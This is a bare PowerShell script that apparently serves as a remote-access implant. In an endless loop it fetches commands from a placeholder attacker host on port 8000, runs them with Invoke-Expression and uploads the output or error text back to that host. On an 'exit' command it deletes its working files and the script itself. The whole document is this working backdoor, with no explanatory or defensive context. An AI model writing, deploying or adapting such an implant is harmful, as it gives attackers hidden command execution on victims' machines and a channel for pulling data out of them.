$x="C:\temp\s.b";
$h="<IP_ATTACKER>:8000";
$ErrorActionPreference = "Stop"
while(1) {
	curl.exe -s $h/c -o $x;
	if((gc -Raw $x) -like "exit"){
		ri -Force "$x*"
		ri "C:\temp\shurl.ps1"
		break
	}
	if(-not [string]::IsNullOrWhiteSpace((gc -Raw $x))) {
		try {           
			iex (gc -Raw $x) >"$x.o";
		}catch{ 
			echo $_ > "$x.e";
			curl.exe $h/u -F f="@$x.e";
			continue
		};
		curl.exe $h/u -F f="@$x.o"
	}
}
